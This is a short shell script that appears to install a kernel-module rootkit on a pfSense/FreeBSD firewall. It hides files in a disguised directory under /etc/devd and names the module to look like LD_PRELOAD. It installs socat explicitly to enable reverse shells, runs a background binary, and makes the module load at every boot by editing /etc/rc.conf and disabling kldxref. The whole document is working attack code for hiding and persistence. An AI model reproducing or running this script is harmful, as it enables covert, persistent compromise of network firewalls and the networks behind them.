#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

# make writable
mount -o rw /
# make maliocus directory
mkdir /etc/devd/conf_backs
# define new directory to hide things in and LKM name
LKM_PATH="/etc/devd/conf_backs"
LKM_NAME="LD_PRELOAD.ko"


# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install socat -y

# executable
chmod +x apeshit

# put the rootkit in the hidden directory
cp "$LKM_NAME" "$LKM_PATH/"
cp "apeshit" "$LKM_PATH/"

# run the daemon/process that does nothing that we intend to fork
cd "$LKM_PATH"
./apeshit &

# achieve persistance by loading the module everytime the system boots
# Ensure kld_list includes the LKM
if grep -q '^kld_list=' /etc/rc.conf; then
    sed -i '' "s/^kld_list=\"/kld_list=\"$LKM_NAME /" /etc/rc.conf
else
    echo "kld_list=\"$LKM_NAME\"" >> /etc/rc.conf
fi

# Disable kldxref by setting kldxref_enable="NO"
sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf

kldload "$LKM_PATH/" "$LKM_NAME"